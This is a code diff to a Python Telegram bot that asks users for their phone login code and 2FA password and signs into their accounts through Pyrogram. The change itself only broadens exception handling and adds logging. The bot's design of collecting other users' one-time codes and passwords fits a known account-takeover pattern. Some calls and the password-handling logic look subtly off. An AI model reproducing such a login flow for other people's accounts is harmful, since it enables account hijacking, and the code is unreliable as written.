@@ -5,7 +5,7 @@ import os
 from telegram import Update
 from telegram.ext import CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application, filters
 from pyrogram import Client
-from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, PyrogramError
+from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
 from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials from config.py
 
 # Constants for conversation states
@@ -92,6 +92,7 @@ async def otp_code(update: Update, context: CallbackContext):
             return ConversationHandler.END
         except Exception as e:
             await update.message.reply(f"❌ An error occurred: {e}. Please try again later.")
+            logging.error(f"Error during OTP request: {e}")
             return ConversationHandler.END
 
 # Step 3: Handle password input (for accounts with 2FA enabled)
@@ -117,8 +118,8 @@ async def password(update: Update, context: CallbackContext):
             await update.message.reply('❌ OTP has expired. Please restart the session.')
             logging.error(f"OTP expired for user {user_id}.")
             return ConversationHandler.END
-        except PyrogramError as e:
-            # This catches errors like 2FA or other issues.
+        except Exception as e:
+            # Catch any other exceptions and log them
             if "2-step verification" in str(e):
                 await update.message.reply("Your account has 2-step verification enabled. Please enter your password.")
                 password = update.message.text
@@ -126,7 +127,7 @@ async def password(update: Update, context: CallbackContext):
                     await client.check_password(password)
                     await update.message.reply("✅ Login successful!")
                     logging.info(f"User {user_id} logged in successfully with password.")
-                except PyrogramError as password_error:
+                except Exception as password_error:
                     await update.message.reply(f"❌ Error: {password_error}. Please restart the session.")
                     logging.error(f"Error during password verification for user {user_id}: {password_error}")
                     return ConversationHandler.END
